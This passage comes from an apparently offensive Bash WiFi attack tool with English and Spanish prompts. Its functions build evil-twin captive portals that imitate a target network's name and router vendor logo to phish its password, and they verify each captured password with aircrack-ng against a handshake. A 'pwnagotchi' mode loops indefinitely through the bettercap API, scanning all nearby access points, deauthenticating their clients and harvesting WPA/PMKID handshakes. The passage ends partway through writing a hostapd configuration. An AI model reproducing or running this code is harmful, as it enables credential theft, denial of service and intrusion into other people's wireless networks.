      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/vodafone.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "ubiquiti")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/ubiquiti.png\" height=65% width=65%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    fi
  fi
}

# Use 'sed' with regex to edit the templates
function edit_template_evil_twin(){
  cp -r "${portals_path}/logos" "${portals_path}/${country_code}-portal/" 2>/dev/null

  # Include the logo of the router's vendor if configured
  if [ "${logo_option}" == "y" ] || [ "${logo_option}" == "yes" ] || [ "${logo_option}" == "s" ] || [ "${logo_option}" == "si" ] || [ ! "${logo_option}" ]; then
    add_vendor_logo_evil_twin
  fi

  sed -i "17s|.*|echo -e '					<span class=\"bold\">${essid}</span>'|" "${portals_path}/${country_code}-portal/index.htm"

  #handshake_path=$(echo "${handshake_cap}" | sed 's/\//\\\//g')

  sed -i "26s|.*|  if [ \"\$(timeout 1.5 bash -c \"aircrack-ng -a 2 -b ${ap_bssid} -w \'${evil_twin_path}/evil_twin_currentpass.txt\' \'${handshake_cap}\' 2>/dev/null \| grep \'KEY FOUND\'\")\" ]; then|" "${portals_path}/${country_code}-portal/check.htm"
}

function restore_templates_evil_twin(){
  for portal_dir in ${portals_path}/* ; do

    # Skip invalid folders
    if [ ! "$(basename "${portal_dir}" | grep "portal")" ]; then
      continue
    fi

    # Remove logos folder
    if [ -d "${portal_dir}/logos" ]; then
      rm -rf "${portal_dir}/logos" 2>/dev/null
    fi

    # Remove vendor logo
    sed -i '14s/.*//' "${portal_dir}/index.htm"

    # Remove ESSID to a common placeholder
    sed -i "17s|.*|echo -e '					<span class=\"bold\">XXXXXXXX</span>'|" "${portal_dir}/index.htm"

    # Update the password check
    sed -i "26s|.*|  if [ \"\$(timeout 1.5 bash -c \"aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w \'${evil_twin_path}/evil_twin_currentpass.txt\' \'${output_path}/XXXXXXXX/XXXXXXXXXX.cap\' 2>/dev/null \| grep \'KEY FOUND\'\")\" ]; then|" "${portal_dir}/check.htm"
  done
}

# This function will check constantly if the correct password was found
# if so, then it tells the user to press [Enter] in order to continue
function check_password_evil_twin(){
  while true; do
    sleep 0.1

    if [ -f "${evil_twin_path}/evil_twin_success.txt" ] && [ "$(cat "${evil_twin_path}/evil_twin_currentpass.txt")" ]; then
      cp "${evil_twin_path}/evil_twin_currentpass.txt" "${output_path}/${ap_dir}/evil_twin_password.txt"

      if [ "$lang" == "en" ]; then
        success "Correct password obtained: $(cat "${evil_twin_path}/evil_twin_currentpass.txt")"
        success "Password stored in ${output_path}/${ap_dir}/evil_twin_password.txt"
      else
        success "Contraseña correcta obtenida: $(cat "${evil_twin_path}/evil_twin_currentpass.txt")"
        success "Contraseña almacenada en ${output_path}/${ap_dir}/evil_twin_password.txt"
      fi

      remove_file "${evil_twin_path}/evil_twin_success.txt"

      sleep 4
      break
    fi
  done
  
  if [ "$lang" == "en" ]; then
    press_enter "Attack finished, press [Enter] to return to the menu in case you want to stop the attack "
  else
    press_enter "El ataque ha terminado, presiona [Enter] para volver al menu si quieres parar el ataque "
  fi
}

# This function will be launched on a new window to show info about the attack
function check_success_evil_twin(){
  while true; do
    arp_out=$(arp -i ${evil_twin_interface} | grep "${evil_twin_interface}" | awk '{print $1}')
    arp_len=$(echo -e "${arp_out}" | wc -l)

    echo -e "Evil Twin"
    echo -e "---------"



    if [ "$lang" == "en" ]; then
      echo -e "Name of the AP: ${essid}\n"
      if [[ ${arp_len} == 1 ]] && [ ! "${arp_out}" ]; then
        echo -e "Devices connected: 0"
      else
        echo -e "Devices connected: ${arp_len}"
      fi
    else
      echo -e "Nombre del AP: ${essid}\n"
      if [[ ${arp_len} == 1 ]] && [ ! "${arp_out}" ]; then
        echo -e "Dispositivos conectados: 0"
      else
        echo -e "Dispositivos conectados: ${arp_len}"
      fi
    fi

    if [[ ${arp_len} != 0 ]] && [ "${arp_out}" ]; then

      if [ "$lang" == "en" ]; then
        echo -e "\nDevices info:"
      else
        echo -e "\nInformación sobre los dispositivos:"
      fi

      echo -e "${arp_out}"
    fi

    if [ -f "${evil_twin_path}/evil_twin_currentpass.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\nLast password attempts:\n$(cat "${evil_twin_path}/evil_twin_attempts.txt" 2>/dev/null)"
      else
        echo -e "\n${blueC}Últimas contraseñas probadas:\n$(cat "${evil_twin_path}/evil_twin_attempts.txt" 2>/dev/null)"
      fi
    fi

    if [ -f "${evil_twin_path}/evil_twin_success.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\nCorrect password: $(cat "${evil_twin_path}/evil_twin_currentpass.txt" 2>/dev/null)"
      else
        echo -e "\nContraseña correcta: $(cat "${evil_twin_path}/evil_twin_currentpass.txt" 2>/dev/null)"
      fi
      sleep 5
      break
    fi

    sleep 1
    clear
  done
}

# Send command to Bettercap API
function execute_bettercap_command(){
  curl -s -X POST "http://user:pass@127.0.0.1:8081/api/session" -H "Content-Type: application/json" -d '{"cmd": "'"${1}"'"}' &>/dev/null
}

# Check if a handshake was captured
function pwnagotchi_check_handshake(){
  sleep 6

  #cch="$(curl -s http://user:pass@127.0.0.1:8081/api/session | jq -r '.wifi.aps' | jq -r --arg mac "${1}" 'map(select(.mac == $mac)) | .[] | if .handshake == true then "true" else "false" end')"

  wpa_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"
  pmkid_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep "PMKID")"

  if [ ! "$wpa_check" ]; then
    wpa_check=0
  fi

  # Debug
  #echo -e "ESSID: ${2}; BSSID: ${1}; wpa_check: ${wpa_check}; pmkid_check: ${pmkid_check}"

  # Check if at least one WPA or PMKID handshake was captured
  if [[ "${wpa_check}" -gt 0 ]] || [ "${pmkid_check}" ]; then
    # Extract handshake from .pcap file
    hcxpcapngtool /root/bettercap-wifi-handshakes.pcap -o "${cache_path}/bettercap_handshakes.txt" &>/dev/null
    sleep 0.1

    if [ "$(cat "${cache_path}/bettercap_handshakes.txt" 2>/dev/null | grep -i "$(echo "${1}" | tr -d ":")")" ]; then
      if [ "${2}" ] && [ ! -f "${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/handshake.txt" ]; then
        if [ "$lang" == "en" ]; then
          success "Handshake from ${2} (${1}) has been captured and written to ${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/handshake.txt"
        else
          success "El handshake de ${2} (${1}) ha sido capturado y guardado como ${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/handshake.txt"
        fi
      elif [ ! "${2}" ] && [ ! -f "${pwnagotchi_path}/${pwnagotchi_dir}/${1}/handshake.txt" ]; then
        if [ "$lang" == "en" ]; then
          success "Handshake from ${1} has been captured and written to ${pwnagotchi_path}/${pwnagotchi_dir}/${1}/handshake.txt"
        else
          success "El handshake de ${1} ha sido capturado y guardado como ${pwnagotchi_path}/${pwnagotchi_dir}/${1}/handshake.txt"
        fi
      fi

      # Create a folder to save captured handshakes based on each AP essid and bssid
      if [ "${2}" ] && [ ! -d "${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/" ]; then
        mkdir "${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/" 2>/dev/null
      elif [ ! "${2}" ]; then
        mkdir "${pwnagotchi_path}/${pwnagotchi_dir}/${1}/" 2>/dev/null
      fi

      sleep 0.1

      if [ "${2}" ]; then
        hcxhashtool -i "${cache_path}/bettercap_handshakes.txt" -o "${pwnagotchi_path}/${pwnagotchi_dir}/${2}_${1}/handshake.txt" --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
      else
        hcxhashtool -i "${cache_path}/bettercap_handshakes.txt" -o "${pwnagotchi_path}/${pwnagotchi_dir}/${1}/handshake.txt" --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
      fi
    fi

    remove_file "${cache_path}/bettercap_handshakes.txt"
  fi
}

# Declare array which will contain the discovered APs
export seen_aps=()
# Declare array which will contain the APs that have been already pwned to skip them during loop
export pwned_aps_list=()
# Declare array which will contain APs that have not been pwned on the first attempt
export not_pwned_aps_list=()
# Declare array which will contain the APs that their handshake have not been captured even after multiple attempts to skip them
export not_pwneable_aps_list=()

function pwnagotchi(){
  clear_screen

  if [ "$lang" == "en" ]; then
    # Display info about current status
    status "PWNAGOTCHI MODE"
    status "---------------\n"

    info "The Pwnagotchi mode runs indefinitely until you press Ctrl+C"
    info "If you want to add an AP to the whitelist, edit the config file and add \"whitelist=<list of bssids>\" sepparated by comma before starting"
    info "Obtained handshakes will be stored under ${pwnagotchi_path}/"
    info "A new folder will be created for every targeted AP to store the obtained info"
  else
    # Display info about current status
    status "MODO PWNAGOTCHI"
    status "---------------\n"

    info "El modo Pwnagotchi correrá de forma infinita hasta que presiones Ctrl+C"
    info "Si quieres añadir un AP a la whitelist, edita el archivo de configuración y añade \"whitelist=<lista de bssids>\" separadas por comas antes de empezar"
    info "Los handshakes obtenidos se almacenarán en ${pwnagotchi_path}/"
    info "Se creará una carpeta por cada AP que sea atacado para almacenar la información obtenida"
  fi

  press_enter_attack

  trap ctrl_c_pwnagotchi INT
  
  # Create directory for current pwnagotchi session
  pwnagotchi_dir="$(get_date)"
  mkdir "${pwnagotchi_path}/${pwnagotchi_dir}/" 2>/dev/null

  if [ "$lang" == "en" ]; then
    status_ln "Launching bettercap service..."
    info "Gathered information will be saved under ${pwnagotchi_path}/${pwnagotchi_dir}/"
  else
    status_ln "Iniciando servicio de bettercap..."
    info "La información obtenida se almacenará bajo la ruta ${pwnagotchi_path}/${pwnagotchi_dir}/"
  fi

  bettercap -caplet http-ui -iface "${monitor_interface}" &>/dev/null &
  sleep 2
  echo

  # Declare variable just to check on first loop
  first_loop="true"

  # Declare debug variable (just for development purposes)
  debug="false"

  # Create an array with the whitelisted BSSIDs from the config file
  IFS=',' read -ra whitelist <<< "$(awk -F '=' '/whitelist/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " " | tr '[:upper:]' '[:lower:]')"

  # Display info about current status
  if [ "$lang" == "en" ]; then
    status "ACTIVITY LOG"
    status "------------"
  else
    status "REGISTRO DE ACTIVIDAD"
    status "---------------------"
  fi

  # Scan nearby APs
  execute_bettercap_command "wifi.recon on"
  sleep 0.5

  # Start infinite loop
  while true; do
    # Scan nearby APs (wifi.recon on)
    # Sleep for 6 seconds
    # Iterate over all APs
    # Change current channel (wifi.recon.channel x) in case it is different
    # Send association to get PMKID (wifi.assoc <bssid>)
    # Deauth all clients (one by one) (wifi.deauth <station>)

    # Set channels on which to scan nearby APs
    execute_bettercap_command "wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13"

    if [ "$lang" == "en" ]; then
      if [ "${first_loop}" == "true" ]; then
        status "Scanning nearby access points"
      else
        status_ln "Scanning new nearby access points\n"
      fi
    else
      if [ "${first_loop}" == "true" ]; then
        status "Escaneando puntos de acceso cercanos"
      else
        status_ln "Escaneando nuevos puntos de acceso cercanos\n"
      fi
    fi

    # Wait some seconds to discover nearby APs and their stations
    sleep 6.75

    # Extract and parse JSON info using jq
    aps="$(curl -s "http://user:pass@127.0.0.1:8081/api/session" | jq -r '.wifi.aps' | jq -r 'map(select((.channel < 36 or .channel > 165) and .encryption != "OPEN")) | sort_by(.channel) | .[] | "\(.mac),\(.hostname),\(.channel)," + (if .clients | length > 0 then "" + (.clients[] | "\(.mac),") else "" end)' | sort -u)"

    if [ "$debug" == "true" ]; then
      echo -e "$aps\n"
    fi

    #echo -e "aps: $aps"
    #echo -e "old_aps: $old_aps"

    # Parse pwned APs
    for d in ${pwnagotchi_path}/${pwnagotchi_dir}/*; do
      pwned_bssid="$(echo "${d}" | awk '{print $NF}' FS="/" | awk '{print $NF}' FS="-")"

      if [ "${pwned_bssid}" != "*" ]; then
        pwned_aps_list+=("${pwned_bssid}")
      fi

      # Remove AP from other arrays because it has been pwned
      if [ "${pwned_bssid}" ] && [ "${pwned_bssid}" != "*" ]; then
        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
        not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
      fi
    done

    # Remove duplicates
    seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    pwned_aps_list=($(echo "${pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))

    activity="false"

    if [ "$debug" == "true" ]; then
      echo -e "seen_aps: ${seen_aps[@]}"
      echo -e "pwned_aps_list: ${pwned_aps_list[@]}"
      echo -e "not_pwned_aps_list: ${not_pwned_aps_list[@]}"
      echo -e "not_pwneable_aps_list: ${not_pwneable_aps_list[@]}\n"
    fi

    # Iterate over all APs discovered
    while IFS= read -r line; do
      already_pwned="false"
      not_pwned="false"
      not_pwneable="false"
      removed_from_seen_aps="false"

      if [ "$stop_pwnagotchi" == "true" ]; then
        if [ "$lang" == "en" ]; then
          warning_ln "Returning to the main menu..."
        else
          warning_ln "Volviendo al menú principal..."
        fi
        sleep 1

        break
      fi

      # Parse information
      bssid="$(echo -e "${line}" | awk '{print $1}' FS=',' | sed 's/^[" "]*//')"
      essid="$(echo -e "${line}" | grep -oP "(?<=${bssid},).*(?=,\d+,)")"
      channel="$(echo -e "${line}" | grep -oP "(?<=${bssid},${essid},)(\d+)(?=,)")"
      stations_info="$(echo -e "${aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"
      IFS=',' read -r -a stations <<< "$stations_info"

      #echo -e "bssid: $bssid"
      #echo -e "essid: $essid"
      #echo -e "channel: $channel"
      #echo -e "stations_info: $stations_info"
      #echo -e "stations: ${stations[@]}"

      # Iterate over the whole whitelist array
      for whitelist_bssid in "${whitelist[@]}"; do
        if [ "${whitelist_bssid}" == "$(echo "${bssid}" | tr '[:upper:]' '[:lower:]')" ]; then
          if [ "$debug" == "true" ]; then
            echo -e "Skipping whitelisted BSSID"
          fi
          continue
        fi
      done

      # Check if current AP was already pwned to skip it
      for pwned_ap in "${pwned_aps_list[@]}"; do
        if [ "${pwned_ap}" == "${bssid}" ]; then
          already_pwned="true"
          break
        fi
      done

      # Skip until next AP
      if [ "$already_pwned" == "true" ]; then
        if [ "$debug" == "true" ]; then
          echo -e "Skipping ${bssid} ($essid) as it is already pwned"
        fi
        continue
      fi

      pwnagotchi_check_handshake "${bssid}" "${essid}" &

      # Check if AP is included in not_pwned_aps_list array
      for not_pwned_ap in "${not_pwned_aps_list[@]}"; do
        if [ "${not_pwned_ap}" == "${bssid}" ]; then
          #echo "Removing $bssid ($essid) from not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
          #echo "Adding $bssid ($essid) to not_pwneable_aps_list: $(echo ${not_pwneable_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwneable_aps_list+=("${bssid}")
          not_pwned="true"
          break
        fi
      done

      # Parse stations associated to each AP and check if new stations were added
      current_stations="${stations_info}"
      old_stations="$(echo "${old_aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"

      if [ "$debug" == "true" ]; then
        echo "current_stations: ${current_stations[@]}"
        echo "old_stations: ${old_stations[@]}"
      fi

      # Check if current AP is marked as a AP which cannot be pwned due to multiple unsuccessful attempts
      for not_pwneable_ap in ${not_pwneable_aps_list[@]}; do
        if [ "${not_pwneable_ap}" == "${bssid}" ] && [ "${current_stations}" == "${old_stations}" ]; then
          not_pwneable="true"
          break
        fi
      done

      # Skip until next AP as current AP is not pwneable
      if [ "${not_pwneable}" == "true" ]; then
        #echo -e "Skipping not pwneable AP: ${bssid}"
        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
        continue
      fi

      # Iterate over seen_aps array to add current AP to not_pwned_aps in case its handshake was not captured
      for seen_ap in "${seen_aps[@]}"; do
        if [ "${seen_ap}" == "${bssid}" ]; then
          #echo "Adding $bssid ($essid) to not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwned_aps_list+=("${bssid}") # Add AP to not_pwned_aps_list array
          #echo "Removing $bssid ($essid) from seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
          removed_from_seen_aps="true"
          break
        fi
      done

      # If current AP is not present in not_pwned_aps_list array, then add it to seen_aps array as it is a new discovered AP
      if [ "${removed_from_seen_aps}" == "false" ] && [ "${not_pwned}" == "false" ] && [ "${not_pwneable}" == "false" ]; then
        # Add bssid to seen_aps arraya
        seen_aps+=("${bssid}")
      fi

      # Change current channel to interact with target if necessary
      if [ "${current_channel}" != "${channel}" ] || [ "$first_loop" == "true" ]; then
        execute_bettercap_command "wifi.recon.channel ${channel}"
        current_channel="${channel}"
        first_loop="false"
        sleep 0.1
      fi

      # Send association to AP to try to catch PMKID handshake
      execute_bettercap_command "wifi.assoc ${bssid}"
      activity="true"

      if [ "$essid" ]; then
        if [ "$lang" == "en" ]; then
          info "Sending association frame to ${essid} (${bssid})"
        else
          info "Enviando paquete de asociación a ${essid} (${bssid})"
        fi
      else
        if [ "$lang" == "en" ]; then
          info "Sending association frame to ${bssid}"
        else
          info "Enviando paquete de asociación a ${bssid}"
        fi
      fi

      sleep 0.2

      # Deauthenticate stations of current AP
      for sta in ${stations}; do
        if [ "$essid" ]; then
          if [ "$lang" == "en" ]; then
            info "Deauthing station ${sta} from ${essid} (${bssid})"
          else
            info "Deautenticando la estación ${sta} de ${essid} (${bssid})"
          fi
        else
          if [ "$lang" == "en" ]; then
            info "Deauthing station ${sta} from ${bssid}"
          else
            info "Deautenticando la estación ${sta} de ${bssid}"
          fi
        fi
        execute_bettercap_command "wifi.deauth ${sta}"

        activity="true"
        sleep 0.2
      done

      sleep 0.1

    done < <(printf '%s\n' "${aps}")

    if [ "${activity}" == "false" ]; then
      if [ "$lang" == "en" ]; then
        status "There is not recent activity (no new APs were discovered)"
      else
        status "No hay actividad reciente (no se encontraron nuevos APs)"
      fi
    fi

    if [ "$stop_pwnagotchi" == "true" ]; then
      killall bettercap &>/dev/null
      rm /root/bettercap-wifi-handshakes.pcap "${cache_path}/bettercap_handshakes.txt" 2>/dev/null
      break
    fi

    old_aps="${aps}"
  done
}

# Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)
function evil_twin_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    info_ln "This attack creates a fake access point to obtain the password of a legitimate access point or credentials by deploying a cautive portal"
  else
    info_ln "Este ataque crea un punto de acceso falso para asi obtener la contraseña del punto de acceso legitimo o credenciales, mediante el uso de un portal cautivo"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  if [ ! "${essid}" ]; then
    essid="unknown"
  fi

  create_dir
	
  if [ "${channel}" -lt "15" ]; then 
    hw_mode=g # 2.4 GHz
  else
    hw_mode=a # 5 GHz
  fi

  if [ "$lang" == "en" ]; then
    info_ln "Available types of attack:\n"
  else
    info_ln "Tipos de ataques disponibles:\n"
  fi
  evil_twin_panel

  while true; do
    echo
    if [ "$lang" == "en" ]; then
      input_no_line "Select an option: " evil_option
    else
      input_no_line "Selecciona una opción: " evil_option
    fi

    if [ "$evil_option" != "1" ] && [ "$evil_option" != "2" ] && [ "$evil_option" != "3" ] && [ "$evil_option" != "4" ] && [ "$evil_option" != "back" ]; then
      log_invalid_option
    else
      break
    fi
  done

  if [ "$evil_option" == "back" ]; then
    return
  fi

  echo
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    if [ "$lang" == "en" ]; then
      input_no_line "Do you want to use built-in templates (1) or custom ones (2)? (default=1): " template_type
    else
      input_no_line "¿Quieres usar plantillas predefinidas (1) o plantillas personalizadas (2)? (por defecto=1): " template_type
    fi

    if [ "${template_type}" == "1" ] || [ "${template_type}" == "default" ] || [ ! "${template_type}" ]; then
      while true; do
        if [ "$lang" == "en" ]; then
          input_no_line "Do you want to verify if submitted passwords are correct? (a valid handshake is needed) (yes/no): " check_passwords
        else
          input_no_line "¿Quieres verificar si las contraseñas introducidas son correctas? (se necesita un handshake valido) (si/no): " check_passwords
        fi

        if [ "${check_passwords}" == "y" ] || [ "${check_passwords}" == "yes" ] || [ "${check_passwords}" == "s" ] || [ "${check_passwords}" == "si" ] || [ "${check_passwords}" == "n" ] || [ "${check_passwords}" == "no" ]; then
          break
        elif [ "${check_passwords}" == "back" ]; then
          return
        else
          log_invalid_option
        fi
      done

      if [ "${check_passwords}" == "y" ] || [ "${check_passwords}" == "yes" ] || [ "${check_passwords}" == "s" ] || [ "${check_passwords}" == "si" ]; then
        while true; do
          if [ "$lang" == "en" ]; then
            input_no_line "Introduce path to handshake file: " handshake_cap
          else
            input_no_line "Introduce la ruta del archivo de handshake: " handshake_cap
          fi

          cap_name="${handshake_cap}"
          if [ "${handshake_cap}" == "back" ]; then
            return
          elif [ -f "${handshake_cap}" ]; then

            if [ ! "$(file "${handshake_cap}" | grep "cap capture file")" ]; then
              if [ "$lang" == "en" ]; then
                warning "Given file is not a valid network capture"
              else
                warning "El archivo no es una captura de red válida"
              fi

              continue
            fi

            if [ "$(check_wpa_handshake "${cap_name}")" == "true" ]; then
              break
            else
              if [ "$lang" == "en" ]; then
                warning "File does not contain any handshake"
              else
                warning "El archivo no contiene ningún handshake"
              fi
            fi
          else
            if [ "$lang" == "en" ]; then
              warning "File does not exist"
            else
              warning "El archivo no existe"
            fi
          fi
        done
      fi
    elif [ "${template_type}" == "2" ] || [ "${template_type}" == "custom" ]; then
      while true; do
        if [ "$lang" == "en" ]; then
          input_no_line "Introduce path to template root: " portal_to_use_path
        else
          input_no_line "Introduce la ruta de la raíz de la plantilla: " portal_to_use_path
        fi

        if [ ! -d "${portal_to_use_path}" ]; then
          if [ "$lang" == "en" ]; then
            warning "Given path cannot be found"
          else
            warning "No se encuentra la ruta especificada"
          fi
        else
          break
        fi
      done
    fi
  fi

  # Ask to spoof BSSID if suitable
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "3" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to spoof ${essid} BSSID? (yes/no) (default=no): " mac_spoof
      else
        input_no_line "¿Quieres suplantar la BSSID de ${essid}? (si/no) (por defecto=no): " mac_spoof
      fi

      if [ ! "$mac_spoof" ]; then
        mac_spoof="no"
      fi

      if [ "${mac_spoof}" == "y" ] || [ "${mac_spoof}" == "yes" ] || [ "${mac_spoof}" == "s" ] || [ "${mac_spoof}" == "si" ] || [ "${mac_spoof}" == "n" ] || [ "${mac_spoof}" == "no" ]; then
        break
      elif [ "${mac_spoof}" == "back" ]; then
        return
      else
        log_invalid_option
      fi
    done
  fi

  # Ask to include the vendor logo if suitable
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to include in the captive portal the logo of the router's vendor based on its BSSID? (yes/no) (default=yes): " logo_option
      else
        input_no_line "¿Quieres incluir en el portal cautivo el logo del vendor del router basado en la BSSID? (si/no) (por defecto=si): " logo_option
      fi

      if [ "${logo_option}" == "yes" ] || [ "${logo_option}" == "y" ] || [ "${logo_option}" == "si" ] || [ "${logo_option}" == "s" ] || [ "${logo_option}" == "no" ] || [ "${logo_option}" == "no" ] || [ ! "${logo_option}" ]; then
        break
      elif [ "${logo_option}" == "back" ]; then
        return
      else
        log_invalid_option
      fi
    done
  fi

  # Ask to enable KARMA mode
  if [ "$(command -v hostapd-wpe)" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to enable KARMA mode? (yes/no) (default=no): " karma
      else
        input_no_line "¿Quieres activar el modo KARMA? (si/no) (por defecto=no): " karma
      fi

      if [ ! "$karma" ]; then
        karma="no"
      fi

      if [ "${karma}" == "y" ] || [ "${karma}" == "yes" ] || [ "${karma}" == "s" ] || [ "${karma}" == "si" ] || [ "${karma}" == "n" ] || [ "${karma}" == "no" ]; then
        break
      elif [ "${karma}" == "back" ]; then
        return
      else
        log_invalid_option
      fi
    done
  else
    if [ "$lang" == "en" ]; then
      warning "KARMA mode is not available since hostapd-wpe is not installed"
    else
      warning "El modo KARMA no esta disponible porque hostapd-wpe no está instalado"
    fi
  fi

  check_and_create "${evil_twin_path}"

  # Notify the user about splitting the network interface
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    if [ "$lang" == "en" ]; then
      if [ "$(check_vif)" ]; then
        success "Your network adapter seems to support VIF (Virtual Interface)"
      else
        warning "Your network adapter does not seem to support VIF (Virtual Interface)"
      fi
    else
      if [ "$(check_vif)" ]; then
        success "Tu adaptador de red parece soportar VIF (Interfaz Virtual)"
      else
        warning "Tu adaptador de red parece no soportar VIF (Interfaz Virtual)"
      fi
    fi

    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "To perform the DoS attack while the AP is running, the physical card must be split into 2 cards (Virtual Interface). Do you want to continue? (yes/no): " vif_check
      else
        input_no_line "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). ¿Quieres continuar? (si/no): " vif_check
      fi

      if [ "${vif_check}" == "y" ] ||  [ "${vif_check}" == "yes" ] ||  [ "${vif_check}" == "s" ] ||  [ "${vif_check}" == "si" ]; then
        break
      elif [ "${vif_check}" == "n" ] || [ "${vif_check}" == "no" ]; then
        break
      elif [ "${vif_check}" == "back" ]; then
        return
      else
        log_invalid_option
      fi
    done

    if [ "$vif_check" == "n" ] || [ "$vif_check" == "no" ] || [ "$vif_check" == "back" ]; then
      if [ "$lang" == "en" ]; then
        status "Going back to menu..."; sleep 0.3
      else
        status "Volviendo al menu..."; sleep 0.3
      fi
      return
    fi
  fi

  trap ctrl_c_evil_twin INT
  if [ "$lang" == "en" ]; then
    info_ln "Configuring the network interface..."
  else
    info_ln "Configurando la interfaz de red..."
  fi

  # Strange workaround for some interface errors & monitor mode
  airmon-ng stop "${monitor_interface}" &>/dev/null; sleep 0.1
  setup_interface_evil_twin

  if [ "$lang" == "en" ]; then
    status "Interface successfully configured"
  else
    status "Interfaz configurada correctamente"
  fi

  systemctl stop systemd-resolved &>/dev/null
  fuser -k 80/tcp &>/dev/null; sleep 0.1

  if [ "${airmon_check_kill}" == "true" ]; then
    airmon-ng check kill &>/dev/null
  fi

  killall dhcpd dnsmasq 2>/dev/null
  rm ${cache_path}/*.conf 2>/dev/null

  if [ "${evil_option}" == "1" ] || [ "${evil_option}" == "2" ]; then
    if [ "${template_type}" == "1" ] || [ "${template_type}" == "default" ] || [ ! "${template_type}" ]; then
      while true; do
        languages="$(ls "${portals_path}" | grep "-" | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)"
        if [ "$lang" == "en" ]; then
          info_ln "Available languages: ${languages}"
          input_no_line "Select captive portal language you want to use, enter country code (i.e. en) (default=en): " country_code
        else
          info_ln "Idiomas disponibles: ${languages}"
          input_no_line "Selecciona el idioma del portal cautivo a usar, introduce el código del país (e.g. es) (por defecto=en): " country_code
        fi

        if [ ! "${country_code}" ]; then
          country_code="en"
          break
        elif [ "${country_code}" == "back" ]; then
          exit_evil_twin
          return
        elif [ "$(echo "${languages}" | grep "${country_code}")" ]; then
          break
        else
          log_invalid_option
        fi
      done
    fi

    # Set root of the web if a custom template was not provided
    if [ ! "${portal_to_use_path}" ]; then
      portal_to_use_path="${portals_path}/${country_code}-portal"
      edit_template_evil_twin
    fi

    create_lighttpd_conf
  fi

  if [ "$lang" == "en" ]; then
    press_enter "Multiple windows will be launched, do not close them. Press [Enter] to continue and launch the attack "
  else
    press_enter "Varias ventanas se van a lanzar, no las cierres. Presiona [Enter] para continuar y lanzar el ataque "
  fi

  ip link set "${evil_twin_interface}" up 2>/dev/null

  sleep 3

  # Creating hostapd configuration file
  if [ "${evil_option}" == "1" ] || [ "${evil_option}" == "2" ]; then
    echo "interface=${evil_twin_interface}
ssid=${essid}
hw_mode=${hw_mode}
channel=${channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211" >> "${cache_path}/hostapd.conf"

